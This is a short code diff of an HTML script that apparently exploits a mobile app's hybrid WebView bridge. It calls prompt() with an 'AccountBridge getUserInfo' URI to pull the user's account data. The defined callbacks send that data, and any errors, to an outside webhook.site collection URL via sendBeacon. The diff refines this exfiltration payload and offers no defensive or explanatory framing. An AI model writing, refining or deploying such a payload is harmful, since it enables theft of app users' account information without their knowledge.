@@ -1,4 +1,14 @@
 <script>
-  window.Wing = { onSuccess:function(id,d){ navigator.sendBeacon('https://webhook.site/a2e74a87-48eb-4f59-a564-a554247bfa4b', d); }, onError:function(){} };
-  prompt('hybrid://AccountBridge:cb1/getUserInfo?{}','wing_hybrid:');
+  window.Wing = { 
+    onSuccess: function(id, d) { 
+      // Safely handle both objects and strings
+      const payload = typeof d === 'object' ? JSON.stringify(d) : d;
+      navigator.sendBeacon('https://webhook.site/a2e74a87-48eb-4f59-a564-a554247bfa4b', payload); 
+    }, 
+    onError: function(err) {
+      navigator.sendBeacon('https://webhook.site/a2e74a87-48eb-4f59-a564-a554247bfa4b', 'Error: ' + err);
+    } 
+  };
+  
+  prompt('hybrid://AccountBridge:cb1/getUserInfo?{}', 'wing_hybrid:');
 </script>
